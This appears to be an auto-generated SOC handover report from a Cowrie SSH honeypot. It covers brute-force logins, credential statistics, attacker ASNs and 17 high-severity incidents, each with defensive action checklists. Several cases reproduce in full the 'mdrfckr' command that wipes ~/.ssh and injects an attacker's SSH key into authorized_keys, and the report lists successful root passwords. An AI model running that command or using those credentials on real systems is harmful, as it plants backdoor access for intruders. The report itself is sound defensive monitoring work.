# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-31 |
| **Generated At** | 2026-03-31T22:33:17Z |
| **Shift Time** | 22:33 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **60** |
| Confirmed Threats | **55** |
| False Positives Filtered | **5** (8.3%) |
| Unique Attacker IPs | **24** |
| Countries of Origin | **11** |
| High Severity Cases | **17** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **43** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **42** |
| Unique Credential Pairs | **36** |
| Unique Usernames | **18** |
| Unique Passwords | **34** |
| Successful Auth Pairs | **17** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 18 |
| `345gs5662d34` | 3 |
| `nobody` | 2 |
| `git` | 2 |
| `oracle` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 4 |
| `345gs5662d34` | 3 |
| `123456` | 3 |
| `555555` | 2 |
| `222222` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 4 |
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `555555` | 2 |
| `admin` | `222222` | 1 |
| `root` | `1qaz2wsx!@` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1qaz2wsx!@` | `211.254.212.59` | 2026-03-31T20:50:06 |
| `root` | `3245gs5662d34` | `211.254.212.59` | 2026-03-31T20:50:10 |
| `root` | `Admin@010` | `77.105.135.77` | 2026-03-31T20:57:00 |
| `root` | `3245gs5662d34` | `77.105.135.77` | 2026-03-31T20:57:04 |
| `root` | `Qwerty123456` | `101.126.67.255` | 2026-03-31T21:00:47 |
| `root` | `3245gs5662d34` | `101.126.67.255` | 2026-03-31T21:00:56 |
| `root` | `Admin@789` | `43.165.197.76` | 2026-03-31T21:01:44 |
| `root` | `3245gs5662d34` | `43.165.197.76` | 2026-03-31T21:01:47 |
| `root` | `P@ssw0rd` | `8.129.28.185` | 2026-03-31T21:22:54 |
| `root` | `!qaz@WSX` | `8.129.28.185` | 2026-03-31T21:22:55 |
| `root` | `ubuntu` | `36.92.84.132` | 2026-03-31T21:22:57 |
| `root` | `abc123` | `8.129.28.185` | 2026-03-31T21:23:00 |
| `root` | `1qaz@wsx` | `8.129.28.185` | 2026-03-31T21:23:03 |
| `root` | `password` | `8.129.28.185` | 2026-03-31T21:23:07 |
| `root` | `4r3e2w1q` | `8.129.28.185` | 2026-03-31T21:23:11 |
| `root` | `555555` | `138.199.39.186` | 2026-03-31T21:46:27 |
| `root` | `555555` | `211.223.41.90` | 2026-03-31T21:46:36 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `101.126.67.255`, `77.105.135.77`, `211.254.212.59`, `43.165.197.76`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **24** |
| Unique ASNs | **20** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS46562` | Performive LLC | 2 | MEDIUM |
| `AS216300` | Closed Joint Stock Company "AbkhazMedia" | 1 | HIGH |
| `AS6876` | TENET Scientific Production Enterprise LLC | 1 | HIGH |
| `AS7633` | Software Technology Parks of India - Bangalore | 1 | HIGH |
| `AS7713` | PT Telekomunikasi Indonesia | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (17)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4e138f3e5e08

| Field | Detail |
|---|---|
| **Source IP** | `211.254.212[.]59` |
| **First Seen** | 2026-03-31 20:50 |
| **Last Seen** | 2026-03-31 20:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 20:50:05` | `cowrie.session.connect` |
| `2026-03-31 20:50:05` | `cowrie.client.version` |
| `2026-03-31 20:50:05` | `cowrie.client.kex` |
| `2026-03-31 20:50:06` | `cowrie.login.success` |
| `2026-03-31 20:50:06` | `cowrie.session.params` |
| `2026-03-31 20:50:06` | `cowrie.command.input` |
| `2026-03-31 20:50:06` | `cowrie.command.failed` |
| `2026-03-31 20:50:06` | `cowrie.log.closed` |
| `2026-03-31 20:50:07` | `cowrie.session.params` |
| `2026-03-31 20:50:07` | `cowrie.command.input` |
| `2026-03-31 20:50:07` | `cowrie.session.file_download` |
| `2026-03-31 20:50:07` | `cowrie.log.closed` |
| `2026-03-31 20:50:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.254.212[.]59` to AbuseIPDB if not already reported
- [ ] Block `211.254.212[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9d9fee551e3

| Field | Detail |
|---|---|
| **Source IP** | `211.254.212[.]59` |
| **First Seen** | 2026-03-31 20:50 |
| **Last Seen** | 2026-03-31 20:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 20:50:09` | `cowrie.session.connect` |
| `2026-03-31 20:50:09` | `cowrie.client.version` |
| `2026-03-31 20:50:09` | `cowrie.client.kex` |
| `2026-03-31 20:50:10` | `cowrie.login.success` |
| `2026-03-31 20:50:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.254.212[.]59` to AbuseIPDB if not already reported
- [ ] Block `211.254.212[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a6ca22c6487

| Field | Detail |
|---|---|
| **Source IP** | `77.105.135[.]77` |
| **First Seen** | 2026-03-31 20:56 |
| **Last Seen** | 2026-03-31 20:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 20:56:59` | `cowrie.session.connect` |
| `2026-03-31 20:56:59` | `cowrie.client.version` |
| `2026-03-31 20:56:59` | `cowrie.client.kex` |
| `2026-03-31 20:57:00` | `cowrie.login.success` |
| `2026-03-31 20:57:00` | `cowrie.session.params` |
| `2026-03-31 20:57:00` | `cowrie.command.input` |
| `2026-03-31 20:57:00` | `cowrie.command.failed` |
| `2026-03-31 20:57:00` | `cowrie.log.closed` |
| `2026-03-31 20:57:01` | `cowrie.session.params` |
| `2026-03-31 20:57:01` | `cowrie.command.input` |
| `2026-03-31 20:57:01` | `cowrie.session.file_download` |
| `2026-03-31 20:57:01` | `cowrie.log.closed` |
| `2026-03-31 20:57:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.105.135[.]77` to AbuseIPDB if not already reported
- [ ] Block `77.105.135[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecf18d547fe1

| Field | Detail |
|---|---|
| **Source IP** | `77.105.135[.]77` |
| **First Seen** | 2026-03-31 20:57 |
| **Last Seen** | 2026-03-31 20:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 20:57:03` | `cowrie.session.connect` |
| `2026-03-31 20:57:03` | `cowrie.client.version` |
| `2026-03-31 20:57:03` | `cowrie.client.kex` |
| `2026-03-31 20:57:04` | `cowrie.login.success` |
| `2026-03-31 20:57:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.105.135[.]77` to AbuseIPDB if not already reported
- [ ] Block `77.105.135[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b420f4fc1811

| Field | Detail |
|---|---|
| **Source IP** | `101.126.67[.]255` |
| **First Seen** | 2026-03-31 21:00 |
| **Last Seen** | 2026-03-31 21:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 21:00:46` | `cowrie.session.connect` |
| `2026-03-31 21:00:46` | `cowrie.client.version` |
| `2026-03-31 21:00:46` | `cowrie.client.kex` |
| `2026-03-31 21:00:47` | `cowrie.login.success` |
| `2026-03-31 21:00:47` | `cowrie.session.params` |
| `2026-03-31 21:00:47` | `cowrie.command.input` |
| `2026-03-31 21:00:47` | `cowrie.command.failed` |
| `2026-03-31 21:00:48` | `cowrie.log.closed` |
| `2026-03-31 21:00:48` | `cowrie.session.params` |
| `2026-03-31 21:00:48` | `cowrie.command.input` |
| `2026-03-31 21:00:48` | `cowrie.session.file_download` |
| `2026-03-31 21:00:48` | `cowrie.log.closed` |
| `2026-03-31 21:00:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.67[.]255` to AbuseIPDB if not already reported
- [ ] Block `101.126.67[.]255` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1f7baa69280

| Field | Detail |
|---|---|
| **Source IP** | `101.126.67[.]255` |
| **First Seen** | 2026-03-31 21:00 |
| **Last Seen** | 2026-03-31 21:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 21:00:55` | `cowrie.session.connect` |
| `2026-03-31 21:00:55` | `cowrie.client.version` |
| `2026-03-31 21:00:55` | `cowrie.client.kex` |
| `2026-03-31 21:00:56` | `cowrie.login.success` |
| `2026-03-31 21:00:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.67[.]255` to AbuseIPDB if not already reported
- [ ] Block `101.126.67[.]255` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbe616fe6a94

| Field | Detail |
|---|---|
| **Source IP** | `43.165.197[.]76` |
| **First Seen** | 2026-03-31 21:01 |
| **Last Seen** | 2026-03-31 21:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 21:01:44` | `cowrie.session.connect` |
| `2026-03-31 21:01:44` | `cowrie.client.version` |
| `2026-03-31 21:01:44` | `cowrie.client.kex` |
| `2026-03-31 21:01:44` | `cowrie.login.success` |
| `2026-03-31 21:01:45` | `cowrie.session.params` |
| `2026-03-31 21:01:45` | `cowrie.command.input` |
| `2026-03-31 21:01:45` | `cowrie.command.failed` |
| `2026-03-31 21:01:45` | `cowrie.log.closed` |
| `2026-03-31 21:01:45` | `cowrie.session.params` |
| `2026-03-31 21:01:45` | `cowrie.command.input` |
| `2026-03-31 21:01:45` | `cowrie.session.file_download` |
| `2026-03-31 21:01:45` | `cowrie.log.closed` |
| `2026-03-31 21:01:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.197[.]76` to AbuseIPDB if not already reported
- [ ] Block `43.165.197[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0230a372faa6

| Field | Detail |
|---|---|
| **Source IP** | `43.165.197[.]76` |
| **First Seen** | 2026-03-31 21:01 |
| **Last Seen** | 2026-03-31 21:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 21:01:47` | `cowrie.session.connect` |
| `2026-03-31 21:01:47` | `cowrie.client.version` |
| `2026-03-31 21:01:47` | `cowrie.client.kex` |
| `2026-03-31 21:01:47` | `cowrie.login.success` |
| `2026-03-31 21:01:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.165.197[.]76` to AbuseIPDB if not already reported
- [ ] Block `43.165.197[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14f61fef1e7f

| Field | Detail |
|---|---|
| **Source IP** | `8.129.28[.]185` |
| **First Seen** | 2026-03-31 21:22 |
| **Last Seen** | 2026-03-31 21:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 21:22:54` | `cowrie.session.connect` |
| `2026-03-31 21:22:54` | `cowrie.client.version` |
| `2026-03-31 21:22:54` | `cowrie.client.kex` |
| `2026-03-31 21:22:54` | `cowrie.login.success` |
| `2026-03-31 21:22:55` | `cowrie.session.params` |
| `2026-03-31 21:22:55` | `cowrie.command.input` |
| `2026-03-31 21:22:55` | `cowrie.log.closed` |
| `2026-03-31 21:22:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.129.28[.]185` to AbuseIPDB if not already reported
- [ ] Block `8.129.28[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1594d35806d9

| Field | Detail |
|---|---|
| **Source IP** | `8.129.28[.]185` |
| **First Seen** | 2026-03-31 21:22 |
| **Last Seen** | 2026-03-31 21:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 21:22:54` | `cowrie.session.connect` |
| `2026-03-31 21:22:54` | `cowrie.client.version` |
| `2026-03-31 21:22:55` | `cowrie.client.kex` |
| `2026-03-31 21:22:55` | `cowrie.login.success` |
| `2026-03-31 21:22:55` | `cowrie.session.params` |
| `2026-03-31 21:22:55` | `cowrie.command.input` |
| `2026-03-31 21:22:55` | `cowrie.log.closed` |
| `2026-03-31 21:22:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.129.28[.]185` to AbuseIPDB if not already reported
- [ ] Block `8.129.28[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec3973d16f75

| Field | Detail |
|---|---|
| **Source IP** | `36.92.84[.]132` |
| **First Seen** | 2026-03-31 21:22 |
| **Last Seen** | 2026-03-31 21:23 |
| **Session Duration** | 57s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 21:22:57` | `cowrie.session.connect` |
| `2026-03-31 21:22:57` | `cowrie.client.version` |
| `2026-03-31 21:22:57` | `cowrie.client.kex` |
| `2026-03-31 21:22:57` | `cowrie.login.success` |
| `2026-03-31 21:23:54` | `cowrie.session.file_upload` |
| `2026-03-31 21:23:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.84[.]132` to AbuseIPDB if not already reported
- [ ] Block `36.92.84[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77210cb4f0ad

| Field | Detail |
|---|---|
| **Source IP** | `8.129.28[.]185` |
| **First Seen** | 2026-03-31 21:23 |
| **Last Seen** | 2026-03-31 21:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 21:23:00` | `cowrie.session.connect` |
| `2026-03-31 21:23:00` | `cowrie.client.version` |
| `2026-03-31 21:23:00` | `cowrie.client.kex` |
| `2026-03-31 21:23:00` | `cowrie.login.success` |
| `2026-03-31 21:23:01` | `cowrie.session.params` |
| `2026-03-31 21:23:01` | `cowrie.command.input` |
| `2026-03-31 21:23:01` | `cowrie.log.closed` |
| `2026-03-31 21:23:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.129.28[.]185` to AbuseIPDB if not already reported
- [ ] Block `8.129.28[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c6904d26efb

| Field | Detail |
|---|---|
| **Source IP** | `8.129.28[.]185` |
| **First Seen** | 2026-03-31 21:23 |
| **Last Seen** | 2026-03-31 21:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 21:23:03` | `cowrie.session.connect` |
| `2026-03-31 21:23:03` | `cowrie.client.version` |
| `2026-03-31 21:23:03` | `cowrie.client.kex` |
| `2026-03-31 21:23:03` | `cowrie.login.success` |
| `2026-03-31 21:23:04` | `cowrie.session.params` |
| `2026-03-31 21:23:04` | `cowrie.command.input` |
| `2026-03-31 21:23:04` | `cowrie.log.closed` |
| `2026-03-31 21:23:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.129.28[.]185` to AbuseIPDB if not already reported
- [ ] Block `8.129.28[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e9e3aa78df7

| Field | Detail |
|---|---|
| **Source IP** | `8.129.28[.]185` |
| **First Seen** | 2026-03-31 21:23 |
| **Last Seen** | 2026-03-31 21:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 21:23:06` | `cowrie.session.connect` |
| `2026-03-31 21:23:06` | `cowrie.client.version` |
| `2026-03-31 21:23:06` | `cowrie.client.kex` |
| `2026-03-31 21:23:07` | `cowrie.login.success` |
| `2026-03-31 21:23:07` | `cowrie.session.params` |
| `2026-03-31 21:23:07` | `cowrie.command.input` |
| `2026-03-31 21:23:07` | `cowrie.log.closed` |
| `2026-03-31 21:23:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.129.28[.]185` to AbuseIPDB if not already reported
- [ ] Block `8.129.28[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1845371090ad

| Field | Detail |
|---|---|
| **Source IP** | `8.129.28[.]185` |
| **First Seen** | 2026-03-31 21:23 |
| **Last Seen** | 2026-03-31 21:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 21:23:10` | `cowrie.session.connect` |
| `2026-03-31 21:23:10` | `cowrie.client.version` |
| `2026-03-31 21:23:11` | `cowrie.client.kex` |
| `2026-03-31 21:23:11` | `cowrie.login.success` |
| `2026-03-31 21:23:11` | `cowrie.session.params` |
| `2026-03-31 21:23:11` | `cowrie.command.input` |
| `2026-03-31 21:23:11` | `cowrie.log.closed` |
| `2026-03-31 21:23:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.129.28[.]185` to AbuseIPDB if not already reported
- [ ] Block `8.129.28[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e052c856a4e

| Field | Detail |
|---|---|
| **Source IP** | `138.199.39[.]186` |
| **First Seen** | 2026-03-31 21:46 |
| **Last Seen** | 2026-03-31 21:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 21:46:24` | `cowrie.session.connect` |
| `2026-03-31 21:46:25` | `cowrie.client.version` |
| `2026-03-31 21:46:25` | `cowrie.client.kex` |
| `2026-03-31 21:46:27` | `cowrie.login.success` |
| `2026-03-31 21:46:27` | `cowrie.direct-tcpip.request` |
| `2026-03-31 21:46:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.199.39[.]186` to AbuseIPDB if not already reported
- [ ] Block `138.199.39[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc65edf0b1d6

| Field | Detail |
|---|---|
| **Source IP** | `211.223.41[.]90` |
| **First Seen** | 2026-03-31 21:46 |
| **Last Seen** | 2026-03-31 21:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 21:46:33` | `cowrie.session.connect` |
| `2026-03-31 21:46:33` | `cowrie.client.version` |
| `2026-03-31 21:46:33` | `cowrie.client.kex` |
| `2026-03-31 21:46:36` | `cowrie.login.success` |
| `2026-03-31 21:46:36` | `cowrie.direct-tcpip.request` |
| `2026-03-31 21:46:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.223.41[.]90` to AbuseIPDB if not already reported
- [ ] Block `211.223.41[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
